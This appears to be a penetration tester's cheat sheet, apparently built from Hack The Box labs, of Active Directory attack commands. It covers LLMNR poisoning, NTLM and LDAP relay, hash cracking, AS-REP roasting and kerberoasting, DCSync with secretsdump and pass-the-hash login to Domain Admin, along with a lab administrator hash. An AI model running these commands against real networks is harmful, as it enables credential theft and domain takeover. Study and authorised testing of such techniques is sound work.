# Active Directory

[Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)


## LLMNR Poisoning

Listen for connections and retrieve hashes

```
responder -I eth0 -rdwv
```

Password cracking with hashcat (NTLMv2)

```
hashcat -m 5600 hash.txt rockyou.txt --force
```

## SMB Relay

(disable smb and http on responder)

Start listening for events on responder

Initialize relay

```
ntlmrelay.py -tf targets.txt -smb2support
```

Retrieve SAM hashes

## CrackMapExec

Brute Force
```
crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt
```

List shares
```
crackmapexec smb 10.10.10.184 -u USER -p PASSWORD --shares
```

null authentication

```
crackmapexec smb 10.10.10.184 --pass-pol -u '' -p '' 
```

## Kerberos

Run impacket/GetNPUsers.py to get the users that don't have the require pre-authentication option

```
GetNPUsers.py -dc-ip IP -no-pass -userfile user.txt
```

Crack the hashes found

Use evil-winrm to connect to the box using the credentials found

Use ntlmrelay.py from Impacket to relay any changes made to LDAP.

```
ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
```

Authenticate by visiting http://localhost/privexchange (any directory will work, this is random). This sets the user ad Domain Admin.

Use Impacketâ€™s secretsdump.py to perform the DCSync attack, gathering all the user hashes:

```
secretsdump.py htb.local/user:password@10.10.10.161 -just-dc -outputfile secrets-dump.txt
```

Login using the Administrator hash

```
evil-winrm -u Administrator -i 10.10.10.161 -H '32693b11e6aa90eb43d32c72a07ceea6'
```

### Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine:
10.10.117.212  CONTROLLER.local

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### Harvesting Tickets w/ Rubeus 

On the target machine
```
Rubeus.exe harvest /interval:30

Rubeus.exe kerberoast 
This will dump the Kerberos hash of any kerberoastable users    
```

### Dumping KRBASREP5 Hashes w/ Rubeus 

```
Rubeus.exe asreproast
```

Crack the resulting hashes

## Ipv6 DNS Takeover via mitm6

[GitHub - fox-it/mitm6: pwning IPv4 via IPv6](https://github.com/fox-it/mitm6)

[The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)